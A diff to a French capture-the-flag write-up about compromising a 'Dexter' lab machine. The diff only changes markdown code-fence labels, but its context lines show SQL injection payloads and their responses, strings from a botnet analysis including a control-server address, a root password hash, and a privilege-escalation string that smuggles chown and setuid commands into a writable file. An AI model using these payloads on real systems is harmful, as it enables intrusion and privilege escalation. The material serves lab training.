@@ -29,7 +29,7 @@ Quand on lance le scan de ports on découvre des services qui ne sont pas sans r
 
 À se demander si le RPC n'est pas actif par défaut sous Debian...  
 
-```plain
+```
 Nmap scan report for 192.168.1.54
 Host is up (0.00023s latency).
 Not shown: 65531 closed ports
@@ -63,7 +63,7 @@ Le second lien est [une analyse automatique du bot](https://malwr.com/analysis/Y
 
 Parmi les chaines qui pourraient être d'une quelquonque utilité on relève :  
 
-```plain
+```
 62.149.24.147
 dexter/gateway.php
 response=
@@ -135,7 +135,7 @@ Ainsi si j'appelle ce script en passant comme paramètre :
 
 J'obtiens ce résultat :  
 
-```plain
+```
 [System Process]
 System
 smss.exe
@@ -219,7 +219,7 @@ for a in args:
 
 Dans l'output généré on voit :  
 
-```plain
+```
 ==================================
 param = page, payload = ' OR sleep(5)#
 timeout !
@@ -274,7 +274,7 @@ for p in payloads:
 
 Pour une UNION avec 3 colonnes on s'apperçoit qu'une valeur de cookie différente est retournée :  
 
-```plain
+```
 payload = ' UNION SELECT NULL#
 CaseInsensitiveDict({'content-length': '20', 'x-powered-by': 'PHP/5.4.4-14+deb7u8', 'set-cookie': 'response=MjU%3D', --- snip ---
 
@@ -305,7 +305,7 @@ payloads = [
 
 Pour le second cas (la chaîne *encodeme* en seconde position) le script me retourne un *Set-Cookie response=MnN4dXlyc3tzLTU%3D* ce qui une fois décodé correspond à :  
 
-```plain
+```
 $encodeme;#
 ```
 
@@ -422,7 +422,7 @@ print decrypt(data)
 
 Une fois un shell récupéré je peux me connecter sur le serveur MySQL avec les identifiants vus plus tôt.  
 
-```plain
+```
 mysql> show tables;
 +----------------------+
 | Tables_in_nasproject |
@@ -504,7 +504,7 @@ Or il se trouve que ce dernier est word-writable. Le modifier pour provoquer une
 
 J'ai finalement tenté ma chance en modifiant la première entrée du dictionnaire de cette façon :  
 
-```plain
+```
 "';chown root.root /var/www/Panel/exes/getroot;chmod +s /var/www/Panel/exes/getroot;#'": "d8fa4356213b6ce9253f55acdff780ac",
 ```
 
@@ -533,7 +533,7 @@ root:$6$gN9t1RCt$dYj80MPAWCeWkh9kTpoPHuUU.x5hfaXfrB.UUWkMQDQpjDfAHO4D2RLWvG00wjU
 
 Quant à l'explication sur le lancement de *antitamper.py* :  
 
-```plain
+```
 root@dexter:~# tail -1 /var/spool/cron/crontabs/root 
 */1 * * * * python /var/www/antitamper.py
 ```
